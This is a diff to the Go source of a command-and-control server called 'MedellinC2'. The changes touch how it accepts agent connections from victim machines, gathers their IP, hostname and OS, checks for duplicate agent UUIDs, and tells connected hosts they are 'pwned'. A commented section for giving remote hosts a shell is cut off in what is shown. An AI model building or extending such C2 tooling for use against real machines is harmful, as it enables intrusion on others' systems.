@@ -46,14 +46,21 @@ func init() {
 //TESTING
 func handleClientRequest(con net.Conn) {
 	//fancy colors for console output
-	colorGreen := "\033[32m"
+	//colorGreen := "\033[32m"
 
 	defer con.Close()
 
 	/* On the TCP server (C2), print below message once a TCP Client (agent) has successfully connected */
 	clientReader := bufio.NewReader(con)
-	fmt.Println(string(colorGreen), "A new agent has successfully connected")
-	getAgentInfo() //get the information such as IP, Hostname, OS of an agent (victim machine)
+	/*
+		fmt.Println(string(colorGreen), "A new agent has successfully connected")
+		getAgentInfo() //get the information such as IP, Hostname, OS of an agent (victim machine)
+		data.CheckDuplicateAgentUUID()
+	*/
+	if data.CheckDuplicateAgentUUID() == true {
+		getAgentInfo()
+	}
+
 	for {
 		// Waiting for the client request
 		clientRequest, err := clientReader.ReadString('\n')
@@ -79,6 +86,8 @@ func handleClientRequest(con net.Conn) {
 		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
 			log.Printf("failed to respond to client: %v\n", err)
 		}
+
+		//Write code to assign the connection to an agent
 
 		//COMMANDS TO GIVE REMOST HOST A SHELL
 		/*
@@ -109,7 +118,7 @@ func server() {
 	for range time.Tick(time.Second * 10) {
 		checkListenerPorts()
 	}
-
+	//go data.CheckDuplicateAgentUUID() //check for duplicate agent UUIDs in the DB
 	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
 	for {
 		con, err := listener.Accept()
